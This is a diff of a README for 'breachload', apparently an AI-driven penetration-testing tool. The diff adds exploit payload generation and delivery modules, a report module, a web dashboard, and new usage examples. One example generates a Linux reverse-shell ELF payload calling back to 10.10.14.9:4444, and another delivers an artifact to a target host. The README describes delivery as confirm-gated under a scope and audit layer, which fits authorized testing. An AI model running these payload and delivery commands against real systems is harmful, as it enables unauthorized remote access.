@@ -29,17 +29,28 @@ breachload/
   safety/      scope, validator, audit
   tools/       adapters (run + parse -> struct); nmap is the reference
   analysis/    cve mapping, cross-service correlation   (planned)
-  report/      findings -> markdown/pdf                  (planned)
+  analysis/    version->CVE mapping, cross-service correlator
+  exploit/     payload generation (msfvenom) + delivery (confirm-gated)
+  report/      findings -> markdown / pdf
+  web/         FastAPI + WebSocket dashboard (on_event seam)
 engagements/   per-engagement scope + state + audit log
 ```
 
 ## Usage
 
 ```bash
-pip install -e .
+pip install -e .                    # add [web] for the dashboard: pip install -e '.[web]'
 export ANTHROPIC_API_KEY=...        # optional; omit for offline heuristic mode
-breachload run engagements/example.yaml --phase recon
-breachload status engagements/example.yaml
+
+breachload run engagements/example.yaml            # auto-chain recon -> enum -> vuln
+breachload status engagements/example.yaml         # current known state
+breachload report engagements/example.yaml --pdf   # Markdown (+ PDF) report
+breachload serve engagements/example.yaml          # run with a live web dashboard
+
+# Exploitation (offline generation is unrestricted; delivery is confirm-gated)
+breachload payload engagements/example.yaml --payload linux/x64/shell_reverse_tcp \
+    --lhost 10.10.14.9 --lport 4444 --fmt elf
+breachload deliver engagements/example.yaml --artifact <name> --target 10.10.10.5
 ```
 
 ## Autonomy & the safety layer
